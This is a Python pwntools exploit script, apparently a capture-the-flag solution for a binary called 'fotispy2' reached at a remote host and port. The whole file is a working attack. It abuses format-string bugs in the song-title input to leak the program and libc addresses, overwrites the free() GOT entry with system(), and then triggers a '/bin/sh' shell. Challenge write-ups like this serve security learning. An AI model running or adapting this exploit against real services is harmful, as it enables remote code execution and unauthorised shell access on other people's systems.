#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 5192
HOST = "52.59.124.14"
exe = context.binary = ELF('./fotispy2_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            # input
            brva 0x000000000000160C
            brva 0x0000000000001641
            brva 0x000000000000167C
            # fmt
            brva 0x000000000000185C
            brva 0x0000000000001887
            brva 0x00000000000018B2
            # free
            brva 0x0000000000001798
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def register(username, password):
    p.sendlineafter(b'[4]: ', str(0))
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'password: ', password)

def login(username, password):
    p.sendlineafter(b'[4]: ', str(1))
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'password: ', password)

def add(song_title, author, album):
    p.sendlineafter(b'[4]: ', str(2))
    p.sendlineafter(b'title: ', song_title)
    p.sendlineafter(b'from: ', author)
    p.sendlineafter(b'on: ', album)

def show():
    p.sendlineafter(b'[4]: ', str(3))

# VARIABLE
rw_section = 0x404800

# PAYLOAD
register(b'nhh', b'abcdxyz')
register(b'nhh1', b'abcdxyz1')
login(b'nhh', b'abcdxyz')

add(b'\0', b'\0', b'1'*0x20)
p.sendlineafter(b'title: ', b'%11$p')
p.sendlineafter(b': ', b'\0')
p.sendlineafter(b': ', b'\0')
show()
p.recvuntil(b'1'*0x20)
exe_leak = int(p.recvuntil(b' -', drop=True), 16)
exe.address = exe_leak - 0x19e5
log.info("Exe base: " + hex(exe.address))

add(b'\0', b'\0', b'1'*0x20)
payload = b'%667$s'.ljust(0xc, b'a') + p64(exe.got.free)
p.sendlineafter(b'title: ', payload)
p.sendlineafter(b': ', b'\0')
p.sendlineafter(b': ', b'\0')
show()
p.recvuntil(b'1'*0x20)
p.recvuntil(b'1'*0x20)
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym.free
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
log.info("System: " + hex(system))

add(b'\0', b'\0', b'1'*0x20)
package = {
    system & 0xffff: exe.got.free,
    system >> 16 & 0xffff: exe.got.free + 2
}
order = sorted(package)

payload = f'%{order[0] - 0x20}c%995$hn'.encode()
payload += f'%{order[1] - order[0]}c%996$hn'.encode()
payload = payload.ljust(0x20, b'a')
payload += p64(package[order[0]])
payload += p64(package[order[1]])
p.sendlineafter(b'title: ', payload)
p.sendlineafter(b': ', b'\0')
p.sendlineafter(b': ', b'\0')
show()

add(b'/bin/sh', b'%', b'\0')

p.interactive()